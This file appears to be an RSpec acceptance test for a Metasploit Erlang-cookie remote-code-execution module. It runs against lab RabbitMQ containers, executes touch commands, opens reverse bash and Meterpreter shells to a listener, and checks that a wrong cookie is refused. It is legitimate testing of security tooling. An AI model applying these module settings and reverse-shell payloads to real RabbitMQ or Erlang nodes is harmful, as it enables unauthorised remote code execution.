require 'acceptance_spec_helper'
require 'rbconfig'

RSpec.describe 'Native RabbitMQ Erlang distribution execution' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    console_command('version')
    argv = [RbConfig.ruby, 'test/module_targets/rabbitmq/native_probe.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-rabbitmq.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-rabbitmq-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    argv = [RbConfig.ruby, 'test/module_targets/erlang_cookie/native_completion.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-completion.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-completion-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
  end

  %w[old new].each do |service|
    [13, 255, 256].each do |length|
      it "executes a #{length}-byte command twice on #{service} with the broker identity" do
        path = '/tmp/e'
        command = 'touch /tmp/e '.ljust(length)
        expect(command.bytesize).to eq(length)
        begin
          2.times do
            target_exec(service, 'test', '!', '-e', path)
            invoke(service, { 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => command, 'DisablePayloadHandler' => true, 'WfsDelay' => 0 })
            wait_for_expect(10, 0.1) { expect(file_owner(service, path)).to eq('rabbitmq') }
            target_exec(service, 'rm', path)
          end
        ensure
          target_exec(service, 'rm', '-f', path)
        end
      end
    end

    it "refuses a wrong #{service} cookie without authentication success or execution" do
      path = '/tmp/module-target-erlang-refused'
      target_exec(service, 'test', '!', '-e', path)
      output = invoke(service, { 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => "touch #{path}", 'COOKIE' => 'WRONG_MODULE_TARGET_COOKIE', 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }, allow_errors: true)
      expect(output).not_to include('Authentication successful')
      expect(output).to match(/Authentication|authentication|challenge|Challenge/)
      expect(target_exec(service, 'test', '!', '-e', path)).to eq('')
    end

    {
      'command shell' => ['cmd/unix/reverse_bash', 0],
      'Linux Meterpreter stager' => ['linux/x64/meterpreter/reverse_tcp', 1]
    }.each do |kind, (payload, target)|
      it "opens a real #{kind} twice on #{service} and proves commands on fresh sessions" do
        path = '/tmp/module-target-erlang-session-proof'
        begin
          2.times do
            original = tmp_files(service)
            target_exec(service, 'test', '!', '-e', path)
            output = invoke(service, {
              'TARGET' => target, 'PAYLOAD' => payload,
              'LHOST' => listener_host, 'LPORT' => 4444, 'DisablePayloadHandler' => false, 'WfsDelay' => 10,
              'CMDSTAGER::FLAVOR' => 'printf', 'CMDSTAGER::TEMP' => '/tmp'
            }, action: 'run -z', timeout: 100)
            session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
            expect(session_id).not_to be_nil, output
            meterpreter = payload.include?('meterpreter')
            command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "touch #{path}"
            proof = console_command("sessions -i #{session_id} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
            expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
            wait_for_expect(15, 0.1) { expect(file_owner(service, path)).to eq('rabbitmq') }
            console_command('sessions -K')
            target_exec(service, 'rm', path)
            wait_for_expect(10, 0.1) { expect(tmp_files(service)).to eq(original) }
          end
        ensure
          console_command('sessions -K')
          target_exec(service, 'rm', '-f', path)
        end
      end
    end
  end

  def invoke(service, options, action: 'run', timeout: 40, allow_errors: false)
    run_target_module('exploit/multi/misc/erlang_cookie_rce', service, {
      'TARGET' => 0, 'COOKIE' => 'MODULE_TARGET_ERLANG_COOKIE', 'VERBOSE' => true
    }.merge(options), action: action, allow_errors: allow_errors, endpoint_options: {
      'RHOST' => target_runtime.fetch('module_endpoints').fetch(service).fetch('host'), 'RPORT' => 25672
    }, command_timeout: timeout)
  end

  def file_owner(service, path)
    target_exec(service, 'sh', '-c', "if test -f #{path}; then stat -c %U #{path}; fi").strip
  end

  def tmp_files(service)
    target_exec(service, 'find', '/tmp', '-mindepth', '1', '-maxdepth', '1', '-printf', '%f\n').lines.map(&:strip).sort
  end
end
